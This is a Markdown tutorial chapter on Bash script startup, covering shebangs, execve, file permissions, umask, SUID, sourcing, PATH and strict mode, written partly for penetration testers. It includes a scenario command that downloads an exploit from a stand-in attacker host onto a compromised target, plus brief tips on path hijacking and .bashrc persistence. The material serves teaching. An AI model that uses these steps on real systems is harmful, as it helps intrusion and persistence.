# Intro, Shebang & Permissions: The Foundations of Automation

---
title: "Intro, Shebang & Permissions"
parent: "[[03b_Bash_Scripting]]"
tags:
  - bash
  - scripting
  - linux
  - kernel
  - permissions
  - debugging
  - environment
created: 2026-01-23
updated: 2026-01-23
difficulty: Beginner to Advanced
length: Long
---

> **Executive Summary**: 
> A Bash script is not just a list of commands; it is a computer program written in the language of the operating system itself. While compiled languages (C, Go) talk to the CPU, Bash talks to the Kernel and the Userland tools. 
>
> This chapter is the definitive guide to the "Startup" phase of a script. We will dissect exactly what happens when you type `./script.sh`, from the Kernel's `execve` system call to the interpreter loading. We will master the Linux permission model as it applies to execution, understand the dangerous differences between `bash` and `sh`, and establish a professional template for reliable automation.

---

## Table of Contents

1. [The Philosophy of Shell Scripting](#1-the-philosophy-of-shell-scripting)
2. [The Shebang (`#!`): Addressing the Kernel](#2-the-shebang--addressing-the-kernel)
    - [2.1 How the Kernel Execs](#21-how-the-kernel-execs)
    - [2.2 The Great Debate: `env` vs Absolute Path](#22-the-great-debate-env-vs-absolute-path)
    - [2.3 The `sh` vs `bash` Trap](#23-the-sh-vs-bash-trap)
3. [Permissions & Execution](#3-permissions--execution)
    - [3.1 The Execute Bit (`+x`)](#31-the-execute-bit-x)
    - [3.2 Umask and Default Permissions](#32-umask-and-default-permissions)
    - [3.3 The SUID Script Myth](#33-the-suid-script-myth)
4. [Modes of Execution](#4-modes-of-execution)
    - [4.1 Subshells (`./script.sh`)](#41-subshells-scriptsh)
    - [4.2 Sourcing (`source script.sh`)](#42-sourcing-source-scriptsh)
    - [4.3 The `exec` Command](#43-the-exec-command)
5. [The Environment](#5-the-environment)
    - [5.1 The `$PATH` Variable](#51-the-path-variable)
    - [5.2 Startup Files (`.bashrc` vs `.profile`)](#52-startup-files-bashrc-vs-profile)
6. [Debugging & Robustness](#6-debugging--robustness)
    - [6.1 Trace Mode (`-x`)](#61-trace-mode--x)
    - [6.2 The Unofficial Strict Mode](#62-the-unofficial-strict-mode)
7. [Practical Lab: The Universal Wrapper](#7-practical-lab-the-universal-wrapper)
8. [Critical Analysis & Checkpoints](#8-critical-analysis--checkpoints)

---

## 1. The Philosophy of Shell Scripting

Before we write code, we must understand *why* we use Bash.

### The Glue Language
Bash is rarely used for heavy computation (like 3D rendering or Machine Learning). It is used for **Orchestration**.
- **Python**: Good for data manipulation.
- **C/Go**: Good for low-level system speed.
- **Bash**: Good for connecting Python, C, and System tools together.

If you are a Penetration Tester, Bash is your primary weapon for "Living off the Land". You cannot always upload a fancy Python framework to a compromised server. But `/bin/bash` is always there.

### The "Everything is a Stream" Concept
Bash excels because it treats data as text streams.
- Tool A produces text.
- Bash pipes it to Tool B.
- Tool B filters it.
- Bash saves it to a file.

---

## 2. The Shebang (`#!`): Addressing the Kernel

You see it in every script: `#!/bin/bash`. But do you know what it actually does?

### 2.1 How the Kernel Execs

When you run `./script.sh` in your terminal, the following chain of events occurs:

1.  **Shell**: Your current shell calls `fork()` to create a new process.
2.  **Syscall**: The new process calls `execve("./script.sh", args, env)`.
3.  **Kernel (Ring 0)**: The kernel opens the file and looks at the **first two bytes**.
    - If bytes are `0x7f 0x45` (ELF): It loads the binary loader (it's a compiled program).
    - If bytes are `0x23 0x21` (`#!`): It interprets this as a **Script**.
4.  **Interpreter Parsing**: The kernel reads the rest of the first line.
    - Example: `#!/bin/bash`
5.  **Re-Execution**: The kernel effectively restarts the `execve` call, but this time it runs:
    - `/bin/bash ./script.sh`

**Deep Insight**:
Because the Kernel parses this line, the path must be an **absolute path** to an executable binary. You cannot put shell aliases or functions in the Shebang. It must be a physical file on the disk.

### 2.2 The Great Debate: `env` vs Absolute Path

Which is better?
1.  `#!/bin/bash`
2.  `#!/usr/bin/env bash`

**Option 1: The Hardcoded Path (`#!/bin/bash`)**
- **Pros**: Secure. You know exactly which binary is running.
- **Cons**: Not portable. On FreeBSD or macOS, bash might be in `/usr/local/bin/bash`. If the file isn't at `/bin/bash`, the script fails instantly.

**Option 2: The Environment Lookup (`#!/usr/bin/env bash`)**
- **Mechanism**: `env` is a utility that looks through your `$PATH` variable to find the first instance of `bash`.
- **Pros**: Highly portable. Works on Linux, macOS, BSD, WSL.
- **Cons**: Slight security risk. If an attacker puts a malicious `bash` binary in `/tmp` and adds `/tmp` to the start of your `$PATH`, your script runs the malware.

**Verdict for Pentesters**: Use `#!/usr/bin/env bash` for tools you release (portability). Use `#!/bin/bash` for scripts you run on compromised systems (predictability).

### 2.3 The `sh` vs `bash` Trap

**WARNING**: Do NOT use `#!/bin/sh` unless you mean it.

- **`sh` (POSIX Shell)**: A strict, minimal standard. It does not support arrays, `[[ ]]` tests, or many convenient loops. On Debian/Ubuntu, `/bin/sh` is actually `dash`, a fast but minimal shell.
- **`bash` (Bourne Again Shell)**: Contains rich features (Arrays, String manipulation, TCP sockets).

**The Error**:
If you write Bash code (like `export MY_IP=${IP//./_}`) but put `#!/bin/sh` at the top:
- It might work on CentOS (where `sh` links to `bash`).
- It will **crash** on Ubuntu (where `sh` links to `dash`).

Always match your Shebang to your code syntax.

---

## 3. Permissions & Execution

Linux separates "Reading" code from "Running" code.

### 3.1 The Execute Bit (`+x`)

File permissions are stored in the inode.
- `r` (Read): Can read the file contents.
- `w` (Write): Can modify the file.
- `x` (Execute): Can ask the kernel to run the file.

**Scenario**: You upload `exploit.sh` to a target.
```bash
# Upload
wget http://attacker.com/exploit.sh

# Try run
./exploit.sh
# Output: Permission denied
```
Why? Because `wget` creates files with default permissions (usually `644` or `rw-r--r--`). The execute bit is off.

**The Fix**:
```bash
chmod +x exploit.sh
```

**The Bypass (If you can't chmod)**:
You can bypass the need for the execute bit by invoking the interpreter manually.
```bash
bash exploit.sh
```
In this case, you are executing `bash` (which already has `+x`), and telling it to read `exploit.sh` (which you have `r` on). The kernel is happy.

### 3.2 Umask and Default Permissions

When you create a file (`touch script.sh`), what permissions does it get?
This is determined by the **umask** (User Mask).

- **Base Permissions**: `666` (rw-rw-rw-) for files.
- **Umask**: Usually `022`.
- **Math**: `666 - 022 = 644` (rw-r--r--).

**Security Implication**: If you run a script as root that creates a sensitive file, and your umask is `000`, that file will be world-readable (`666`).
**Best Practice**: In sensitive scripts, set `umask 077` at the start. This ensures created files are only readable by the owner (`600`).

### 3.3 The SUID Script Myth

You might think: "If I do `chmod u+s script.sh`, and root owns it, when I run it, I become root!"

**Reality**: **NO.**
For security reasons, Linux ignores the SUID bit on interpreted scripts (text files starting with `#!`). This avoids massive race conditions where users could manipulate the file execution.
SUID only works on **Compiled Binaries** (ELF files).

**Workaround**: If you need a SUID script, you must write a tiny C wrapper that executes the script, compile the C code, and make the C binary SUID.

---

## 4. Modes of Execution

How you run the script determines where variables live.

### 4.1 Subshells (`./script.sh`)
This creates a **Child Process**.
- The child inherits environment variables from the parent.
- The child runs the code.
- The child dies.
- **Crucial**: Any variables created inside the script **die with the child**. They do NOT affect your current shell.

```bash
# content of test.sh
export NEW_VAR="Hello"

# terminal
./test.sh
echo $NEW_VAR
# Output: (Empty)
```

### 4.2 Sourcing (`source script.sh` or `. script.sh`)
This executes the code **in the current process**.
- No child is created.
- Variables defined in the script **persist** in your terminal.
- **Danger**: If the script runs `exit`, your terminal closes!

**Use Case**: Loading configuration files or libraries.
```bash
# config.sh
DB_PASS="secret"

# main.sh
source config.sh
echo "Connecting with $DB_PASS"
```

### 4.3 The `exec` Command
This replaces the **current process** with the new command.
```bash
exec ./script.sh
```
- Your current bash shell is erased from memory.
- `script.sh` loads in its place.
- When `script.sh` finishes, the process ends (Terminal closes).
- **Use Case**: Wrapper scripts that set up an environment and then launch the real application, saving memory by not keeping the wrapper running.

---

## 5. The Environment

Scripts do not run in a vacuum. They inherit the environment.

### 5.1 The `$PATH` Variable
When you type `ls`, how does Linux know to run `/bin/ls`?
It searches the directories listed in `$PATH` in order.

**Security Risk (Path Hijacking)**:
If `.` (Current Directory) is in the PATH (e.g., `PATH=.:/bin:/usr/bin`), and I drop a malicious file named `ls` in the current folder...
When you type `ls`, my malware runs instead of `/bin/ls`.

**Scripting Defense**:
Always set a safe PATH at the top of your scripts, or use absolute paths.
```bash
#!/bin/bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

### 5.2 Startup Files (`.bashrc` vs `.profile`)
When you log in or start a script, Bash reads config files.
- **Interactive Login Shell** (SSH login): Reads `~/.bash_profile` or `~/.profile`.
- **Interactive Non-Login Shell** (Opening a new tab): Reads `~/.bashrc`.
- **Non-Interactive Shell** (Running a script): Reads environment from `BASH_ENV` if set.

**Persistence Tip**: Attackers love adding one-liners to `~/.bashrc`. Every time the user opens a terminal, the malware runs.

---

## 6. Debugging & Robustness

Scripts fail. Good scripts fail loudly.

### 6.1 Trace Mode (`-x`)
The best debugging tool. It prints every command *after* variable expansion but *before* execution.
```bash
#!/bin/bash
set -x
TARGET="1.1.1.1"
ping $TARGET
```
Output:
```text
+ TARGET=1.1.1.1
+ ping 1.1.1.1
...
```

### 6.2 The Unofficial Strict Mode
Start every serious script with this:
```bash
set -euo pipefail
```
- **`-e` (Exit immediately)**: If any command fails (non-zero exit code), the script stops. Prevents "snowballing" errors (e.g., `cd` fails, then `rm -rf *` runs in the wrong folder).
- **`-u` (Unset variables)**: Using a variable that isn't defined causes an error. Prevents `rm -rf /$DIR` deleting root if `$DIR` is empty.
- **`-o pipefail`**: If `cmd1 | cmd2` runs, and `cmd1` fails but `cmd2` succeeds, the whole pipe is considered a failure.

---

## 7. Practical Lab: The Universal Wrapper

Let's build a script that demonstrates these concepts. This script will be a "Wrapper" that sets up a safe environment and runs a command.

**File**: `safe_runner.sh`

```bash
#!/usr/bin/env bash

# 1. Strict Mode
set -euo pipefail

# 2. Secure Umask (Only I can read files created by this script)
umask 077

# 3. Secure Path
export PATH=/usr/bin:/bin

# 4. Debugging (Optional, check for flag)
if [[ "${1:-}" == "--debug" ]]; then
    set -x
    shift # Remove the --debug arg so it doesn't mess up the rest
fi

# 5. Logic
echo "[+] Starting Safe Runner as user: $(whoami)"
echo "[+] Current Umask: $(umask)"
echo "[+] PATH is: $PATH"

# 6. Check for arguments
if [[ $# -eq 0 ]]; then
    echo "Usage: $0 [--debug] <command_to_run>" >&2
    exit 1
fi

# 7. Run the command passed by user
TARGET_CMD="$1"
echo "[+] Executing: $TARGET_CMD"

# We use 'eval' carefully here to allow arguments in the string
# In production, be very careful with eval!
eval "$TARGET_CMD"

echo "[+] Done."
```

**Exercise**:
1.  Run normally: `./safe_runner.sh "ls -la"`
2.  Run debug: `./safe_runner.sh --debug "ls -la"`
3.  Check file creation permissions: `./safe_runner.sh "touch secret.txt"` -> Check `ls -l secret.txt` (Should be `-rw-------`).

---

## 8. Critical Analysis & Checkpoints

### Common Pitfalls
1.  **Editing on Windows**: If you write a script on Notepad (Windows) and upload it to Linux, it will have `\r\n` line endings (CRLF). Linux expects `\n` (LF).
    - **Symptom**: `bash: ./script.sh: /bin/bash^M: bad interpreter`
    - **Fix**: `dos2unix script.sh`.
2.  **Sudo in Scripts**: Avoid putting `sudo` *inside* scripts. It breaks flow if the password prompt appears. Instead, check for UID 0 at the start (`if [[ $EUID -ne 0 ]]; then exit 1; fi`) and force the user to run the whole script with sudo.

### Checkpoint Questions
1.  **Q**: Why does `cd` inside a script not change the directory of my terminal after the script finishes?
    -   *A**: Because the script runs in a **Subshell** (Child process). The child changes its directory, then dies. The Parent (your terminal) remains where it was. To change the parent, you must `source` the script.
2.  **Q**: What does `set -e` protect against?
    -   *A**: Continued execution after failure. Example: `cd /missing_dir; rm -rf *`. Without `-e`, `cd` fails, script stays in current dir, and `rm` deletes everything in the *wrong* folder.
3.  **Q**: How can you run a script that doesn't have the `+x` bit set?
    -   *A**: Pass it as an argument to the interpreter: `bash script.sh`.

### Final Thoughts
The Shebang and Permissions are the handshake between your code and the Operating System. If you get them wrong, nothing runs. If you get them right, you have a solid foundation to build complex automation.

---
*End of Chapter 01*
